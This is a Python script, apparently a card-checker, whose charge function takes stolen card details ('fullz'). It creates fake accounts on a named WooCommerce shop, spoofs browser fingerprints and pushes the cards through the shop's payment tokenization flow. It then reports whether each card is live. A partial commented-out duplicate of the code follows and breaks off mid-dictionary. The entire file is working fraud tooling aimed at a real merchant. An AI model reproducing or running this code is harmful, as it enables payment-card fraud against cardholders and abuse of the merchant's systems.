
import names
from .datagen import *
import random
from FUNC.usersdb_func import *
from FUNC.defs import *




# import requests
# import names
# from datagen import *
# import random



def multiexplode(string):
    lista = str(string)
    if lista.__contains__('|'):
        final = lista.split('|')
        return final
    elif lista.__contains__(':'):
        final = lista.split(':')
        return final
    

def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None
    
def multiexplode(string):
    lista = str(string)
    if lista.__contains__('|'):
        final = lista.split('|')
        return final
    elif lista.__contains__(':'):
        final = lista.split(':')
        return final
    
import requests
def charge(fullz):
    try:
        lista = fullz
        # proxy = str(socks5_proxy())
        # print(proxy)
        cc = multiexplode(lista)[0]
        mes = multiexplode(lista)[1]
        ano = multiexplode(lista)[2]
        cvv = multiexplode(lista)[3]
        if mes[0:1] == '1': mesnew = mes
        else : mesnew = mes[1:2]
        if len(ano) == 2:
            ano = "20" + ano
        session = requests.Session()
        session.cookies.clear()
        rand_user = RandUser().rand_user()

        header1 = {
            'Origin': 'https://www.dd8shop.com',
            'Referer': 'https://www.dd8shop.com/my-account/add-payment-method/',
            'Sec-Ch-Ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
        }
        res_1 = session.get(url="https://www.dd8shop.com/my-account/add-payment-method/",headers=header1)

        rigester_none = find_between(res_1.text, 'name="woocommerce-register-nonce" value="', '"')

        #-------------------------------------------#
        email = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999999)}@gmail.com"

        data_2 = {
            "email": email,
            "password": "123@Password8494",
            "woocommerce-register-nonce": rigester_none,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "register": "Register"
        }
        res_2 = session.post(url="https://www.dd8shop.com/my-account/add-payment-method/", data=data_2,headers=header1)
        # print(f"res_2 = {res_2.status_code}\n{res_2.headers}")


        #------------------------------------------------#


        res_3 = session.get(url="https://www.dd8shop.com/my-account/edit-address/billing/",headers=header1)


        address_nonce = find_between(res_3.text, 'name="woocommerce-edit-address-nonce" value="', '"')

        #-----------------------------------------------#


        #-------------FIll Address------------------#

        header3 = {
            'Origin': 'https://www.dd8shop.com',
            'Referer': 'https://www.dd8shop.com/my-account/edit-address/billing/',
            'Sec-Ch-Ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
        }

        data_3 = {
            "billing_first_name": rand_user["first_name"],
            "billing_last_name": rand_user["last_name"],
            "billing_country": "US",
            "billing_address_1": rand_user["street"],
            "billing_city": rand_user["city"],
            "billing_state": rand_user["state"],
            "billing_postcode": rand_user["zip"],
            "billing_phone": "8765454345",
            "billing_email": email,
            "save_address": "Save address",
            "woocommerce-edit-address-nonce": address_nonce,
            "_wp_http_referer": "/my-account/edit-address/billing/",
            "action": "edit_address"
        }

        res_4 = session.post(url="https://www.dd8shop.com/my-account/edit-address/billing/",data=data_3,headers=header3)


        #----------------------------------------------------------#

        res_5 = session.get(url="https://www.dd8shop.com/my-account/add-payment-method/",headers=header1)

        add_nonce = find_between(res_5.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')

        # print(res_5.text)


        #--------------------------------------------------------------#

        while True:
            res1 = session.get("https://pci-connect.squareup.com/payments/hydrate?applicationId=sq0idp-wGVapF8sNt9PLrdj5znuKA&hostname=www.dd8shop.com&locationId=L09TDVVXNJ733&version=1.51.4")
            try:
                sessionId = res1.json()["sessionId"]
                break
            except:
                continue

        data_1 = {"components":"{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}","fingerprint":"ecf627cd8814a922bb0f6770f1ec1579","timezone":"-330","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","version":"ab516279fb80f0bfbaf0965f9b301de3c05db9dd","website_url":"https://www.dd8shop.com/","client_id":"sq0idp-wGVapF8sNt9PLrdj5znuKA","browser_fingerprint_by_version":[{"payload_json":"{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"ecf627cd8814a922bb0f6770f1ec1579\"}","payload_type":"fingerprint-v1"},{"payload_json":"{\"components\":{\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"f39d2f00ff0809ced69852f7a51fe749\"}","payload_type":"fingerprint-v1-sans-ua"}]}

        respon_v2 = session.post(url="https://connect.squareup.com/v2/analytics/token", json=data_1)

        analytics_token = respon_v2.json()["token"]


        #_----------------------------------------#


        url_4 = "https://pci-connect.squareup.com/v2/card-nonce?_=1694789398336.826&version=1.51.4"

        data_4 = {
            "client_id": "sq0idp-wGVapF8sNt9PLrdj5znuKA",
            "location_id": "L09TDVVXNJ733",
            "payment_method_tracking_id": "f38634cb-2a21-083f-0494-872d6c2e24e9",
            "session_id": sessionId,
            "website_url": "www.dd8shop.com",
            "analytics_token": analytics_token,
            "card_data": {
                "billing_postal_code": rand_user["zip"],
                "cvv": cvv,
                "exp_month": int(mesnew),
                "exp_year": int(ano),
                "number": cc
            }
        }

        token_res = session.post(url=url_4,json=data_4)
        # print(token_res.text)

        if "card_brand" in token_res.text:
            card_nonce = token_res.json()["card_nonce"]
            card_brand = token_res.json()["card"]["card_brand"]
            last_4 = token_res.json()["card"]["last_4"]
        else:
            response = "Error While Creating the payment Method !"


        url_6 = "https://connect.squareup.com/v2/analytics/verifications"

        data_6 = {
            "browser_fingerprint_by_version": [
                {
                    "payload_json": "{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"ecf627cd8814a922bb0f6770f1ec1579\"}",
                    "payload_type": "fingerprint-v1"
                },
                {
                    "payload_json": "{\"components\":{\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"f39d2f00ff0809ced69852f7a51fe749\"}",
                    "payload_type": "fingerprint-v1-sans-ua"
                }
            ],
            "browser_profile": {
                "components": "{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}",
                "fingerprint": "ecf627cd8814a922bb0f6770f1ec1579",
                "timezone": "-330",
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
                "version": "ab516279fb80f0bfbaf0965f9b301de3c05db9dd",
                "website_url": "https://www.dd8shop.com/"
            },
            "client_id": "sq0idp-wGVapF8sNt9PLrdj5znuKA",
            "payment_source": card_nonce,
            "universal_token": {
                "token": "L09TDVVXNJ733",
                "type": "UNIT"
            },
            "verification_details": {
                "billing_contact": {
                    "address_lines": ["123 5th Ave", ""],
                    "city": rand_user["city"],
                    "country": "US",
                    "email": email,
                    "family_name": rand_user["last_name"],
                    "given_name": rand_user["first_name"],
                    "phone": rand_user["phone"],
                    "postal_code": rand_user["phone"],
                    "region": rand_user["state"]
                },
                "intent": "STORE"
            }
        }

        res_6 = session.post(url=url_6,json=data_6)

        if '"status":"COMPLETED"' in res_6.text:
            token_veri = res_6.json()["token"]

        else:
            response = "ERROR! WHILE CREATING VERFICATION TOKEN"

        last_url = "https://www.dd8shop.com/my-account/add-payment-method/"

        last_data = {
            "payment_method": "square_credit_card",
            "wc-square-credit-card-card-type": card_brand,
            "wc-square-credit-card-last-four": last_4,
            "wc-square-credit-card-exp-month": int(mesnew),
            "wc-square-credit-card-exp-year": int(ano),
            "wc-square-credit-card-payment-nonce": card_nonce,
            "wc-square-credit-card-payment-postcode": rand_user["zip"],
            "wc-square-credit-card-buyer-verification-token": token_veri,
            "wc-square-credit-card-tokenize-payment-method": "true",
            "woocommerce-add-payment-method-nonce": add_nonce,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "woocommerce_add_payment_method": "1"
        }

        last_res = session.post(url=last_url,data=last_data,headers=header1)

        if "New payment method added" in last_res.text or "Nice! New payment method added" in last_res.text:
            response = "Authorized Successfully🟢"

        else:
            response = "We Were Not Able To Update Your Payment Method.Please Try Again Using Other Card Or Change Payment Method.Your Card Was Declined"
        
        resp = response

        print(resp)
        return resp
    


    except Exception as e:
        print(e)




# def multiexplode(string):
#     lista = str(string)
#     if lista.__contains__('|'):
#         final = lista.split('|')
#         return final
#     elif lista.__contains__(':'):
#         final = lista.split(':')
#         return final
    

# def find_between(data, first, last):
#     try:
#         start = data.index(first) + len(first)
#         end = data.index(last, start)
#         return data[start:end]
#     except ValueError:
#         return None
    
# def multiexplode(string):
#     lista = str(string)
#     if lista.__contains__('|'):
#         final = lista.split('|')
#         return final
#     elif lista.__contains__(':'):
#         final = lista.split(':')
#         return final
    
# import requests
# def charge(fullz):
#     try:
#         lista = fullz
#         # proxy = str(socks5_proxy())
#         # print(proxy)
#         cc = multiexplode(lista)[0]
#         mes = multiexplode(lista)[1]
#         ano = multiexplode(lista)[2]
#         cvv = multiexplode(lista)[3]
#         if mes[0:1] == '1': mesnew = mes
#         else : mesnew = mes[1:2]
#         if len(ano) == 2:
#             ano = "20" + ano
#         session = requests.Session()
#         session.cookies.clear()
#         rand_user = RandUser().rand_user()

#         header1 = {
#             'Origin': 'https://www.dd8shop.com',
#             'Referer': 'https://www.dd8shop.com/my-account/add-payment-method/',
#             'Sec-Ch-Ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
#             'Sec-Ch-Ua-Mobile': '?0',
#             'Sec-Ch-Ua-Platform': '"Windows"',
#             'Sec-Fetch-Dest': 'document',
#             'Sec-Fetch-Mode': 'navigate',
#             'Sec-Fetch-Site': 'same-origin',
#             'Sec-Fetch-User': '?1',
#             'Upgrade-Insecure-Requests': '1',
#             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
#         }
#         res_1 = session.get(url="https://www.dd8shop.com/my-account/add-payment-method/",headers=header1)

#         rigester_none = find_between(res_1.text, 'name="woocommerce-register-nonce" value="', '"')

#         #-------------------------------------------#
#         email = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999999)}@gmail.com"

#         data_2 = {
#             "email": email,
#             "password": "123@Password8494",
#             "woocommerce-register-nonce": rigester_none,
#             "_wp_http_referer": "/my-account/add-payment-method/",
#             "register": "Register"
#         }
#         res_2 = session.post(url="https://www.dd8shop.com/my-account/add-payment-method/", data=data_2,headers=header1)
#         print(f"res_2 = {res_2.status_code}\n{res_2.headers}")


#         #------------------------------------------------#


#         res_3 = session.get(url="https://www.dd8shop.com/my-account/edit-address/billing/",headers=header1)


#         address_nonce = find_between(res_3.text, 'name="woocommerce-edit-address-nonce" value="', '"')

#         #-----------------------------------------------#


#         #-------------FIll Address------------------#

#         header3 = {
#             'Origin': 'https://www.dd8shop.com',
#             'Referer': 'https://www.dd8shop.com/my-account/edit-address/billing/',
#             'Sec-Ch-Ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
#             'Sec-Ch-Ua-Mobile': '?0',
#             'Sec-Ch-Ua-Platform': '"Windows"',
#             'Sec-Fetch-Dest': 'document',
#             'Sec-Fetch-Mode': 'navigate',
#             'Sec-Fetch-Site': 'same-origin',
#             'Sec-Fetch-User': '?1',
#             'Upgrade-Insecure-Requests': '1',
#             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
#         }

#         data_3 = {
#             "billing_first_name": rand_user["first_name"],
#             "billing_last_name": rand_user["last_name"],
#             "billing_country": "US",
#             "billing_address_1": rand_user["street"],
#             "billing_city": rand_user["city"],
#             "billing_state": rand_user["state"],
#             "billing_postcode": rand_user["zip"],
#             "billing_phone": "8765454345",
#             "billing_email": email,
#             "save_address": "Save address",
#             "woocommerce-edit-address-nonce": address_nonce,
#             "_wp_http_referer": "/my-account/edit-address/billing/",
#             "action": "edit_address"
#         }

#         res_4 = session.post(url="https://www.dd8shop.com/my-account/edit-address/billing/",data=data_3,headers=header3)


#         #----------------------------------------------------------#

#         res_5 = session.get(url="https://www.dd8shop.com/my-account/add-payment-method/",headers=header1)

#         add_nonce = find_between(res_5.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')

#         # print(res_5.text)


#         #--------------------------------------------------------------#

#         while True:
#             res1 = session.get("https://pci-connect.squareup.com/payments/hydrate?applicationId=sq0idp-wGVapF8sNt9PLrdj5znuKA&hostname=www.dd8shop.com&locationId=L09TDVVXNJ733&version=1.51.4")
#             try:
#                 sessionId = res1.json()["sessionId"]
#                 break
#             except:
#                 continue

#         data_1 = {"components":"{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}","fingerprint":"ecf627cd8814a922bb0f6770f1ec1579","timezone":"-330","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","version":"ab516279fb80f0bfbaf0965f9b301de3c05db9dd","website_url":"https://www.dd8shop.com/","client_id":"sq0idp-wGVapF8sNt9PLrdj5znuKA","browser_fingerprint_by_version":[{"payload_json":"{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"ecf627cd8814a922bb0f6770f1ec1579\"}","payload_type":"fingerprint-v1"},{"payload_json":"{\"components\":{\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"f39d2f00ff0809ced69852f7a51fe749\"}","payload_type":"fingerprint-v1-sans-ua"}]}

#         respon_v2 = session.post(url="https://connect.squareup.com/v2/analytics/token", json=data_1)

#         analytics_token = respon_v2.json()["token"]


#         #_----------------------------------------#


#         url_4 = "https://pci-connect.squareup.com/v2/card-nonce?_=1694789398336.826&version=1.51.4"

#         data_4 = {
#             "client_id": "sq0idp-wGVapF8sNt9PLrdj5znuKA",
#             "location_id": "L09TDVVXNJ733",
#             "payment_method_tracking_id": "f38634cb-2a21-083f-0494-872d6c2e24e9",
#             "session_id": sessionId,
